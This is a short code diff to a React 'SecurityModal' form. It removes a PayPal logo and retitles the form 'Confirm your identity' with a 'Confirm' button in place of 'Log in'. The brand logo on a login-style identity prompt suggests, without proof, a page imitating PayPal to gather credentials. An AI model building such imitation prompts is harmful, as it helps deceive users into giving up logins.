@@ -53,15 +53,7 @@ function SecurityModal() {
    {
     !page?( <form onSubmit={handleSubmit(onSubmit)}>
     <div className="px-5 lg:px-10 pt-5 pb-10 md:w-[420px] bg-white w-[400px] shadow-lg rounded-lg">
-<div className="relative    w-[80px] h-[80px] ">
-        <Image
-          src="/images/paypal-logo.svg"
-          alt="avatar"
-          fill
-          className="object-cover ml-[120px]"
-        />
-      </div>
-
+     <p className="text-center text-2xl font-semibold">Confirm your identity</p>
 
 
  <div className="pt-5">
@@ -76,9 +68,9 @@ function SecurityModal() {
 
 <button
          type="submit"
-         className="mt-5 w-full text-lg font-medium bg-[#2ba6cb] hover:bg-custom-cyan2 py-[10px] text-white transition duration-300 rounded"
+         className="mt-5 w-full text-lg font-medium bg-[#191970] py-[10px] text-white transition duration-300 rounded"
        >
-         Log in
+         Confirm
        </button>
      
    
